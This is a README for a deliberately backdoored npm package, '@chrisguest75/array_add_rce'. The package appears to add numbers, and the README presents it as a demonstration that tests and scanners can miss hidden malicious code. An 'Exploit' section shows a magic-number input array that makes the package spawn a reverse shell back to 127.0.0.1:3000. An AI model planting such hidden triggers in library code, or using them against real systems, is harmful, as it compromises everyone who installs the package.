# README.md 
This is a bad module.  It contains a Remote Code Execution exploit that is intentionally exploitable.  

Published to : https://www.npmjs.com/package/@chrisguest75/array_add_rce  

## Create
Simple steps to recreate and push to github and npm 
```sh
git init 
npm init --scope=@chrisguest75
hub create
```

## Test
It's good that the unittests pass, right?  
```sh
npm test
```

## Publish 

```sh
npm publish --access public
```

## Usage
You can use [npq](https://www.npmjs.com/package/npq) to install.  
But it will tell you there are no vulnerabilities. 

```sh
npm install @chrisguest75/array_add_rce
```

```js
const [addTwoNumbers, addArrayNumbers] = require('@chrisguest75/array_add_rce');

let numbers = [1, 2, 3, 4, 5];
let answer = addArrayNumbers(numbers);
```

## Exploit
It contains a magic number that spawns a reverse shell.

```js
const [addTwoNumbers, addArrayNumbers] = require('@chrisguest75/array_add_rce');

// Connect back to port 127.0.0.1:3000
let numbers = [967, 78, 127, 0, 0, 0, 3000];
let answer = addArrayNumbers(numbers);
```

## Linting
Required extension
```sh
code --install-extension dbaeumer.vscode-eslint
```

Run linting from shell
```sh
npm run-script lint   
```